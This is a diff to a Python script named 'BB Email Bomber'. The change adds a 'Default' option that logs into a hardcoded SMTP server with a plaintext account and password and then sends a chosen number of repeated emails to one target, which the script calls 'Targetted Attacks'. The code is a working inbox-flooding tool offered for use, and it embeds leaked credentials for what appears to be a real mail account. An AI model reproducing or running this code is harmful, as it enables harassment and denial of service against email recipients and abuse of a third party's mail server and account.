@@ -53,21 +53,44 @@ Choose a Mail Service:
 1) Gmail
 2) Yahoo
 3) Hotmail/Outlook
+4) Default (Use our Default mail server)
 ''' + bcolors.ENDC + '--------------------------------------------------------------')
 try:
 	server = input(bcolors.OKGREEN + 'Mail Server: ' + bcolors.ENDC)
-	user = input(bcolors.OKGREEN + 'Your Email: ' + bcolors.ENDC)
-	pwd = getpass.getpass(bcolors.OKGREEN + 'Password: ' + bcolors.ENDC)
-	to = input(bcolors.OKGREEN + 'To: ' + bcolors.ENDC)
-	subject = input(bcolors.OKGREEN + 'Subject: ' + bcolors.ENDC)
-	body = input(bcolors.OKGREEN + 'Message: ' + bcolors.ENDC)
-	nomes = input(bcolors.OKGREEN + 'Number of Emails to send: ' + bcolors.ENDC)
-	nomes = int(nomes)
-	no = 0
-	message = 'From: ' + user + '\nSubject: ' + subject + '\n' + body
 except KeyboardInterrupt:
 	print(bcolors.FAIL + '\nCanceled' + bcolors.ENDC)
 	sys.exit()
+
+if server == '4' or server == 'default' or server == 'Default':
+	try:
+		# server = input(bcolors.OKGREEN + 'Mail Server: ' + bcolors.ENDC)
+		user = 'admin@flepikino.com'
+		pwd = 'Sakib@786'
+		to = input(bcolors.OKGREEN + 'To: ' + bcolors.ENDC)
+		subject = input(bcolors.OKGREEN + 'Subject: ' + bcolors.ENDC)
+		body = input(bcolors.OKGREEN + 'Message: ' + bcolors.ENDC)
+		nomes = input(bcolors.OKGREEN + 'Number of Emails to send: ' + bcolors.ENDC)
+		nomes = int(nomes)
+		no = 0
+		message = 'From: ' + user + '\nSubject: ' + subject + '\n' + body
+	except KeyboardInterrupt:
+		print(bcolors.FAIL + '\nCanceled' + bcolors.ENDC)
+		sys.exit()
+else: 
+	try:
+		# server = input(bcolors.OKGREEN + 'Mail Server: ' + bcolors.ENDC)
+		user = input(bcolors.OKGREEN + 'Your Email: ' + bcolors.ENDC)
+		pwd = getpass.getpass(bcolors.OKGREEN + 'Password: ' + bcolors.ENDC)
+		to = input(bcolors.OKGREEN + 'To: ' + bcolors.ENDC)
+		subject = input(bcolors.OKGREEN + 'Subject: ' + bcolors.ENDC)
+		body = input(bcolors.OKGREEN + 'Message: ' + bcolors.ENDC)
+		nomes = input(bcolors.OKGREEN + 'Number of Emails to send: ' + bcolors.ENDC)
+		nomes = int(nomes)
+		no = 0
+		message = 'From: ' + user + '\nSubject: ' + subject + '\n' + body
+	except KeyboardInterrupt:
+		print(bcolors.FAIL + '\nCanceled' + bcolors.ENDC)
+		sys.exit()
 
 #Gmail
 
@@ -149,6 +172,34 @@ elif server == '3' or server == 'outlook' or server == 'Outlook' or server == 'H
 			sys.exit()
 		except smtplib.SMTPAuthenticationError:
 			print('\nThe username or password you entered is incorrect.')
+			sys.exit()
+		except:
+			print(bcolors.FAIL + "Failed to Send" + bcolors.ENDC)
+	print(bcolors.OKGREEN + '\nBB Email Bomber Has finished Targetted Attacks Successfully\n' + bcolors.ENDC)
+	server.close()
+
+
+if server == '4' or server == 'default' or server == 'Default':
+	bomb(to)
+	server = smtplib.SMTP("mail.brainstation.com.bd", 587)
+	server.ehlo()
+	server.starttls()
+	try:
+		server.login(user, pwd)
+	except smtplib.SMTPAuthenticationError:
+		print(bcolors.FAIL + '''Your Username or Password is incorrect, please try again using the correct credentials
+		Or you need to enable less secure apps
+		On Gmail: https://myaccount.google.com/lesssecureapps ''' + bcolors.ENDC)
+		sys.exit()
+	while no != nomes:
+		try:
+			message = 'From: ' + user + '\nSubject: ' + subject + str(no) + '\n' + body
+			server.sendmail(user, to, message)
+			print(bcolors.WARNING + 'Successfully sent ' + str(no+1) + ' emails' + bcolors.ENDC)
+			no += 1
+			time.sleep(.8)
+		except KeyboardInterrupt:
+			print(bcolors.FAIL + '\nCanceled' + bcolors.ENDC)
 			sys.exit()
 		except:
 			print(bcolors.FAIL + "Failed to Send" + bcolors.ENDC)
